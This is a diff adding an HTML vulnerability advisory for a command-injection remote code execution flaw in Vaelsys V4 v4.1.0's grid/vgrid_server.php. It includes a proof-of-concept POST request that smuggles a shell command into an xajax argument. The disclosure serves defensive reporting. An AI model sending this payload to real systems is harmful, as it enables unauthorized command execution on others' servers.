@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title># Remote Code Execution in Vaelsys V4 Platform,Remote Code Execution in Vaelsys V4 Platform</title>
+    <link rel="stylesheet" href="/assets/css/notes.min.css">
+</head>
+<body>
+    <div class="main-content-wrapper">
+        <main class="content">
+            <h1>Remote Code Execution in Vaelsys V4 Platform</h1>
+<p>BUG_Author: waiwai</p>
+<p>Affected Version: v4.1.0</p>
+<p>Vendor：<a href="https://vaelsys.com/">Vaelsys</a></p>
+<p>Product: Vaelsys V4</p>
+<p>Vulnerability Files: /grid/vgrid_server.php</p>
+<h2>Description</h2>
+<p>The vulnerability allows arbitrary command execution by injecting malicious payloads into unfiltered user input parameters that are processed in <code>execute_DataObjectProc</code> by <code>testConnectivity</code> function located in <code>grid/vgrid_server.php</code>.</p>
+<p>Prerequisites: Valid PHP session ID (PHPSESSID) required; No authentication required.</p>
+<h2>POC</h2>
+<pre><code>POST /grid/vgrid_server.php HTTP/1.1
+Host: [target_ip]
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=[valid_session]
+xajax=execute_DataObjectProc&amp;xajaxargs[]=auth&amp;xajaxargs[]=testConnectivity&amp;xajaxargs[]=&lt;xjxobj&gt;&lt;e&gt;&lt;k&gt;0&lt;/k&gt;&lt;v&gt;192.168.1.201;ls /;&lt;/v&gt;&lt;/e&gt;&lt;/xjxobj&gt;
+</code></pre>
+<h2>Example</h2>
+<p>Included authchallenge：</p>
+<p><img src="/0101/CVEs/Vaelsys/assets/Remote_Code_Execution_in_Vaelsys_V4_Platform/image-20250716101121777.png" alt="image-20250716101121777"></p>
+<p>Not included authchallenge：The prerequisites have been verified</p>
+<p><img src="/0101/CVEs/Vaelsys/assets/Remote_Code_Execution_in_Vaelsys_V4_Platform/1111111111.png" alt="屏幕截图 2025-07-16 101134"></p>
+
+        </main>
+    </div>
+</body>
+</html>
